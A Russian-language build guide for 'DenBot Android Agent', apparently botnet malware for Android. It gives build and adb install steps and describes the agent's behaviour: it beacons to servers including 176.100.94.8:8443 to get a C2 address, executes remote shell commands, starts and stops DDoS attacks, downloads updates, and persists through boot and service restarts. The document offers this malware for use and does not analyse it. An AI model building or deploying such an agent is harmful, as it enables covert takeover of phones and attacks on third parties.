# DenBot Android Agent - Build Instructions

## Структура проекта

```
DenBotAndroid/
├── app/
│   ├── src/main/
│   │   ├── AndroidManifest.xml
│   │   ├── kotlin/com/denbot/agent/
│   │   │   ├── C2Service.kt
│   │   │   ├── BootReceiver.kt
│   │   │   └── MainActivity.kt
│   │   └── res/values/strings.xml
│   └── build.gradle
├── build.gradle
└── settings.gradle
```

## Способ 1: Android Studio (Рекомендуется)

1. **Скачайте Android Studio**
   - https://developer.android.com/studio

2. **Создайте новый проект**
   - File → New → New Android Project
   - Name: DenBotAndroid
   - Package: com.denbot.agent
   - Minimum API: 24
   - Empty Activity

3. **Скопируйте файлы**
   - Замените `MainActivity.kt` на предоставленный
   - Добавьте `C2Service.kt` и `BootReceiver.kt` в `app/src/main/kotlin/com/denbot/agent/`
   - Замените `AndroidManifest.xml`
   - Замените `app/build.gradle`

4. **Соберите APK**
   - Build → Build Bundle(s) / APK(s) → Build APK(s)
   - APK находится в `app/build/outputs/apk/debug/app-debug.apk`

## Способ 2: Command Line (Gradle)

```bash
# 1. Установите Android SDK (если не установлен)
# https://developer.android.com/studio/command-line/sdkmanager

# 2. Клонируйте/создайте структуру проекта

# 3. Соберите
./gradlew build

# 4. Постройте APK
./gradlew assembleDebug

# APK: app/build/outputs/apk/debug/app-debug.apk
```

## Что делает агент

- **Подключается к beacon-серверу** (по доменам из BEACON_DOMAINS)
- **Получает адрес C2** динамически
- **Отправляет heartbeats** каждые 60 секунд
- **Обрабатывает команды** из C2:
  - `shell` - выполнение shell команд
  - `start_ddos` - атака (имитация)
  - `download_update` - скачивание обновления
  - `stop_ddos` - остановка атаки
- **Стартует при загрузке** (если включена permission)
- **Работает в фоне** как Service

## Установка APK на устройство

```bash
# Via adb
adb install app/build/outputs/apk/debug/app-debug.apk

# Или просто скопируйте на устройство и установите через Files/File Manager
```

## Требования

- Android 7.0+ (API 24+)
- Internet permission (запрашивается автоматически)
- BOOT_COMPLETED permission для автостарта

## Тестирование

1. Убедитесь что beacon-server работает на 176.100.94.8:8443
2. C2 работает на IP что вернул beacon
3. Установите APK на Android 15 устройство
4. Проверьте логи: `adb logcat | grep DenBot-C2`

## Конфигурация

Если нужно изменить доменыили порты:
- Отредактируйте `BEACON_DOMAINS` в `C2Service.kt`
- Пересоберите APK

## Логирование

```bash
adb logcat | grep DenBot-C2
```

## Заметки

- APK минифицирован в release режиме
- Работает на реальных устройствах Android 15 (API 35)
- Service автоматически перезапускается если убит системой
- Все сообщения в JSON формате совместимые с C2 сервером
